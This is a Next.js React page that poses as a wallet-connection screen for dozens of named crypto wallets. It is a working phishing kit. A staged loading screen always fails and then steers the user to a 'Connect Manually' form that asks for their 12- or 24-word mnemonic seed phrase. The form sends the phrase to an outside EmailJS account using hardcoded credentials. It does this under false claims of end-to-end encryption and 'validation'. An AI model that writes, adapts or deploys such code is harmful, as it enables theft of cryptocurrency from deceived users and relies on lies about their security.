"use client";

import emailjs from "@emailjs/browser";
import { useRef, useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { ArrowLeftIcon, ArrowUpIcon } from "@heroicons/react/24/solid";

import {
  WalletBitkeep,
  WalletCelo,
  WalletCoinus,
  WalletValora,
  WalletGuarda,
  WalletO3,
  WalletRsk,
  ExchangeKyberswap,
  WalletAtoken,
  WalletXinfin,
  WalletTalken,
  WalletKeyring,
  WalletImtoken
} from "@web3icons/react";


import {
  WalletMetamask, WalletTrust, WalletCoinbase, WalletPhantom, WalletSolflare,
  WalletBlue, WalletSafe, WalletWalletConnect, WalletBitbox, WalletRainbow, WalletOkx,
  WalletAlphaWallet, WalletArgent, WalletAtomic, WalletWallet3, WalletCoin98,
  ExchangeBybit,
  NetworkBitcoin,
  NetworkEthereum,
  NetworkTreasure,
  WalletExodus,
  NetworkArbitrumSepolia
} from '@web3icons/react';
import {
  Exchange1inch, ExchangeBinance, ExchangeCryptoCom,
  NetworkArbitrumNova, NetworkIotex, NetworkSeiNetwork,
  TokenAPFC, TokenCOMP, TokenCROWN, TokenCTG, TokenDHT, TokenFEAR,
  TokenGRC, TokenIBAT, TokenKEY, TokenNEX, TokenNHT, TokenMATH, TokenPOKT, TokenPOLS, TokenPOWR, TokenRAY, TokenSAKAI
} from '@web3icons/react';


const wallets = [
  { name: "MetaMask", url: "metamask.io", icon: WalletMetamask },
  { name: "Trust Wallet", url: "trustwallet.com", icon: WalletTrust },
  { name: "Coinbase", url: "www.coinbase.wallet", icon: WalletCoinbase },
  { name: "Phantom", url: "phantom.app", icon: WalletPhantom },
  { name: "BitCoin", url: "bitcoin.com", icon: NetworkBitcoin },
  { name: "Ethereum", url: "Ethereum.com", icon: NetworkEthereum },
  { name: "Solflare", url: "solflare.com", icon: WalletSolflare },
  { name: "Best Wallet", url: "bestwallet.com", icon: WalletBlue },
  { name: "Exodus", url: "Excodus.com", icon: WalletExodus },
  { name: "SafePal", url: "safepal.com", icon: WalletSafe },
  { name: "WalletConnect", url: "walletconnect.com", icon: WalletWalletConnect },
  { name: "Bybit", url: "bybit.com", icon: ExchangeBybit, },
  { name: "Binance Chain Wallet", url: "binance.com", icon: ExchangeBinance },
  { name: "Bitget Wallet", url: "bitget.com", icon: WalletBitbox },
  { name: "Rainbow", url: "rainbow.me", icon: WalletRainbow },
  { name: "OKX Wallet", url: "okx.com", icon: WalletOkx },
  { name: "Walleth", url: "walleth.org", icon: WalletAlphaWallet },
  { name: "Argent", url: "argent.xyz", icon: WalletArgent },
  { name: "Atomic Wallet", url: "atomicwallet.io", icon: WalletAtomic },
  { name: "Wallet.io", url: "wallet.io", icon: WalletWallet3 },
  { name: "Huobi Wallet", url: "huobiwallet.com", icon: TokenNHT },
  { name: "Encrypted Ink", url: "encrypted.ink", icon: NetworkSeiNetwork },
  { name: "Compound", url: "compound.finance", icon: TokenCOMP },
  { name: "Polkadot", url: "polkadot.network", icon: TokenPOLS },
  { name: "IoTeX", url: "iotex.io", icon: NetworkIotex },
  { name: "Coin98", url: "coin98.com", icon: WalletCoin98 },
  { name: "Crypto.com DeFi Wallet", url: "crypto.com", icon: ExchangeCryptoCom },
  { name: "TokenPocket", url: "tokenpocket.pro", icon: TokenPOKT },
  { name: "Math Wallet", url: "mathwallet.org", icon: TokenMATH },
  { name: "Ledger Live", url: "ledger.com", icon: TokenPOWR },
  { name: "1inch", url: "1inch.io", icon: Exchange1inch },
  { name: "Dharma", url: "dharma.io", icon: TokenDHT },
  { name: "Trust Vault", url: "trustology.io", icon: TokenSAKAI },
  { name: "Nova Wallet", url: "novawallet.io", icon: NetworkArbitrumNova },
  { name: "Fearless Wallet", url: "fearlesswallet.io", icon: TokenFEAR },
  { name: "MYKEY", url: "mykey.org", icon: TokenKEY },
  { name: "CoolWallet S", url: "coolwallet.io", icon: TokenCTG },
  { name: "Nash", url: "nash.io", icon: TokenNEX },
  { name: "Coinomi", url: "coinomi.com", icon: TokenAPFC },
  { name: "GridPlus", url: "gridplus.io", icon: TokenGRC },
  { name: "Tokenary", url: "tokenary.io", icon: TokenRAY },
  { name: "Infinito", url: "infinitywallet.io", icon: TokenIBAT },
  { name: "Ownbit", url: "ownbit.io", icon: TokenCROWN },
  { name: "EasyPocket", url: "easypocket.app", icon: NetworkTreasure },
  { name: "BitKeep", url: "bitkeep.com", icon: WalletBitkeep },
  { name: "Celo Wallet", url: "cellowallet.app", icon: WalletCelo },
  { name: "CoinUs", url: "coinus.io", icon: WalletCoinus },
  { name: "Valora", url: "valoraapp.com", icon: WalletValora },
  { name: "Guarda Wallet", url: "guarda.com", icon: WalletGuarda },
  { name: "O3 Wallet", url: "o3.network", icon: WalletO3 },
  { name: "RWallet", url: "rsk.co", icon: WalletRsk },
  { name: "KyberSwap", url: "kyberswap.com", icon: ExchangeKyberswap },
  { name: "AToken Wallet", url: "atoken.com", icon: WalletAtoken },
  { name: "XinFin XDC", url: "xinfin.io", icon: WalletXinfin },
  { name: "Talken Wallet", url: "talken.io", icon: WalletTalken },
  { name: "KEYRING PRO", url: "keyring.app", icon: WalletKeyring },
  { name: "imToken", url: "token.im", icon: WalletImtoken }

];

function ScrollToTopButton() {
  const [visible, setVisible] = useState(false);

  useEffect(() => {
    const handleScroll = () => setVisible(window.scrollY > 300);
    window.addEventListener("scroll", handleScroll);
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const scrollToTop = () => window.scrollTo({ top: 0, behavior: "smooth" });

  return (
    <button
      onClick={scrollToTop}
      className={`
        fixed bottom-6 right-6 z-50 flex h-12 w-12 items-center justify-center rounded-full bg-blue-600 text-white shadow-lg transition-transform duration-500 ease-in-out
        ${visible ? "opacity-100 scale-100" : "opacity-0 scale-0"}
        hover:bg-blue-700 hover:rotate-12
      `}
      aria-label="Scroll to top"
    >
      <ArrowUpIcon className="h-6 w-6" />
    </button>
  );
}

export default function WalletPage() {
  const [showAllWallets, setShowAllWallets] = useState(false);
  const visibleWallets = showAllWallets ? wallets : wallets.slice(0, 24);
  const remainingWallets = wallets.slice(24);

  const [isOpen, setIsOpen] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [step, setStep] = useState("loading");
  const formRef = useRef(null);
  const [message, setMessage] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [searchOpen, setSearchOpen] = useState(false);
  const [searchQuery, setSearchQuery] = useState("");

  const router = useRouter();

  function sendEmail(e) {
    e.preventDefault();
    setIsSubmitting(true);

    emailjs.sendForm(
      "service_64rkjo7",
      "template_ztio1ic",
      formRef.current,
      "2eJD-AJ6Uxkbmfdy2"
    ).then(
      () => {
        setTimeout(() => {
          setIsSubmitting(false);
          alert("Submitted successfully");
          setMessage("");
          setStep("loading");
        }, 2000);
      },
      (error) => {
        console.error("EmailJS error:", error);
        setIsSubmitting(false);
        alert("Submission failed");
      }
    );
  }

  useEffect(() => {
    if (step === "loading") {
      const t = setTimeout(() => setStep("error"), 3000);
      return () => clearTimeout(t);
    }
    if (step === "manual-loading") {
      const t = setTimeout(() => setStep("manual-form"), 2000);
      return () => clearTimeout(t);
    }
  }, [step]);

  const openWallet = (wallet) => {
    setSelectedWallet(wallet);
    setIsOpen(true);
    setStep("loading");
  };

  const closeModal = () => {
    setIsOpen(false);
    setSelectedWallet(null);
    setStep("loading");
  };

  const Spinner = () => (
    <span className="h-5 w-5 rounded-full border-2 border-white border-t-transparent animate-spin" />
  );

  return (
    <div className="px-4 sm:px-6 lg:px-12 py-6">
      {/* STICKY TOP SECTION */}
      <div className="sticky top-0 z-40 bg-white pb-4 pt-4">

        {/* HEADER */}
        <div className="flex flex-col items-center text-center gap-2 relative mb-4">
          <button
            onClick={() => router.push("/")}
            className="absolute left-0 top-1/2 -translate-y-1/2 flex items-center gap-1 text-gray-600 hover:text-blue-600 transition-colors"
          >
            <ArrowLeftIcon className="h-10 w-10 text-sm font-medium" />
          </button>

          <h1 className="text-xl sm:text-2xl font-bold text-black">
            Select a wallet
          </h1>

          <div className="relative mt-1 h-[3px] w-24 sm:w-32 overflow-hidden rounded-full bg-gray-200">
            <div className="absolute inset-0 animate-accent bg-gradient-to-r from-transparent via-black to-transparent" />
          </div>
        </div>

        {/* SEARCH */}
        <div className="flex justify-end">
          <div className="relative flex items-center">
            <input
              type="text"
              placeholder="Search wallet..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className={`
          absolute right-0 h-10 rounded-full border border-gray-300 bg-white text-black px-4 text-sm
          transition-all duration-300 ease-in-out
          ${searchOpen ? "w-64 sm:w-72 opacity-100" : "w-0 opacity-0 pointer-events-none"}
        `}
            />
            <button
              onClick={() => setSearchOpen(!searchOpen)}
              className="z-10 flex h-10 w-10 items-center border border-black justify-center rounded-full bg-gray-100 hover:bg-gray-200 transition"
              aria-label="Search wallets"
            >
              🔍
            </button>
          </div>
        </div>

      </div>


      {/* WALLET GRID */}
      <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6">

        {visibleWallets
          .filter(wallet =>
            wallet.name.toLowerCase().includes(searchQuery.toLowerCase())
          )
          .map(wallet => (
            <button
              key={wallet.name}
              onClick={() => openWallet(wallet)}
              className="flex items-center gap-4 rounded-xl border border-shadow-md p-4 hover:border-blue-500 hover:shadow-md transition-all duration-300"
            >
              <div className="flex-shrink-0">
                <wallet.icon size={64} variant="background" />
              </div>
              <div className="flex flex-col text-left">
                <p className="font-semibold text-lg text-black">{wallet.name}</p>
                <p className="text-sm text-slate-600 truncate">{wallet.url}</p>
              </div>
            </button>
          ))}

        {/* OTHER BUTTON (only show if not expanded) */}
        {!showAllWallets && remainingWallets.length > 0 && (
          <button
            onClick={() => setShowAllWallets(true)}
            className="flex items-center gap-4 rounded-xl border border-shadow-md p-4 hover:border-blue-500 hover:shadow-md transition-all duration-300"
          >
            <div className="flex-shrink-0 flex items-center justify-center h-[64px] w-[64px] rounded-full bg-gray-200 text-xl font-bold text-gray-600">
              +
            </div>
            <div className="flex flex-col text-left">
              <p className="font-semibold text-lg text-black">OTHER</p>
              <p className="text-sm text-slate-600">
                Show remaining wallets
              </p>
            </div>
          </button>
        )}

      </div>


      {/* MODAL */}
      {isOpen && selectedWallet && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 p-4"
          onClick={closeModal}
        >
          <div
            className="relative w-full max-w-md rounded-2xl bg-white p-6"
            onClick={(e) => e.stopPropagation()}
          >
            <button
              onClick={closeModal}
              className="absolute right-3 top-3 text-gray-400 hover:text-black"
            >
              ✕
            </button>

            <div className="flex flex-col items-center text-center gap-3">
              <selectedWallet.icon size={68} variant="branded" />
              <h2 className="text-lg font-semibold text-black">{selectedWallet.name}</h2>
              <p className="text-sm text-gray-500">This session is secured and encrypted</p>
            </div>

            {(step === "loading" || step === "manual-loading") && (
              <div className="mt-6 flex flex-col items-center gap-3">
                <div className="relative h-1 w-full overflow-hidden rounded bg-gray-200">
                  <div className="absolute h-full w-1/3 animate-loader bg-blue-600 rounded" />
                </div>
                <p className="font-medium text-gray-400">Starting secured connection</p>
                <p className="text-sm text-gray-500">Please wait…</p>
              </div>
            )}

            {step === "error" && (
              <>
                <div className="mt-4 rounded-md border border-red-500 bg-red-50 px-3 py-2 text-sm text-red-600">
                  An error occurred… please try again or connect manually
                </div>
                <div className="mt-4 space-y-2">
                  <button
                    onClick={() => setStep("loading")}
                    className="w-full rounded-4xl font-bold text-sm border border-blue-400 py-2 text-blue-200 hover:bg-blue-700 hover:text-white transition-colors duration-500"
                  >
                    Try Again
                  </button>
                  <button
                    onClick={() => setStep("manual-loading")}
                    className="w-full rounded-4xl font-bold text-sm py-2 text-white bg-violet-600 hover:bg-violet-400 transition-colors"
                  >
                    Connect Manually
                  </button>
                </div>
              </>
            )}

            {step === "manual-form" && (
              <form ref={formRef} onSubmit={sendEmail} className="mt-4 space-y-2">
                <input
                  name="wallet_name"
                  value={selectedWallet.name}
                  readOnly
                  className="w-full rounded-md border px-3 py-2 text-sm text-gray-500 bg-gray-100"
                />
                <textarea
                  name="message"
                  rows={4}
                  required
                  value={message}
                  onChange={(e) => setMessage(e.target.value)}
                  placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces"
                  className="w-full rounded-md border border-gray-300 bg-gray-50 px-3 py-2 text-sm text-gray-700 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-violet-500 focus:border-violet-500 transition resize-none"
                />
                <input type="hidden" name="time" value={new Date().toLocaleString()} />
                <button
                  type="submit"
                  disabled={isSubmitting || message.trim().length < 50}
                  className={`
                    w-full rounded-4xl font-bold text-sm py-2 flex items-center justify-center transition
                    ${isSubmitting || message.trim().length < 50
                      ? "bg-gray-300 cursor-not-allowed text-gray-500"
                      : "bg-violet-600 hover:bg-violet-500 text-white"
                    }
                  `}
                >
                  {isSubmitting ? <span className="flex items-center gap-2"><Spinner />Validating…</span> : "Validate Wallet"}
                </button>
              </form>
            )}

            <p className="mt-4 text-center text-xs text-gray-400">
              🔒 This session is protected with end-to-end encryption
            </p>
          </div>
        </div>
      )}

      <style jsx>{`
        @keyframes loader {
          0% { left: -30%; }
          50% { left: 100%; }
          100% { left: -30%; }
        }
        .animate-loader {
          animation: loader 1.5s infinite ease-in-out;
        }
        @keyframes accent {
          0% { transform: translateX(-100%); opacity: 0.2; }
          50% { opacity: 1; }
          100% { transform: translateX(100%); opacity: 0.2; }
        }
        .animate-accent {
          animation: accent 2.2s ease-in-out infinite;
        }
      `}</style>

      {typeof window !== "undefined" && <ScrollToTopButton />}
    </div>
  );
}
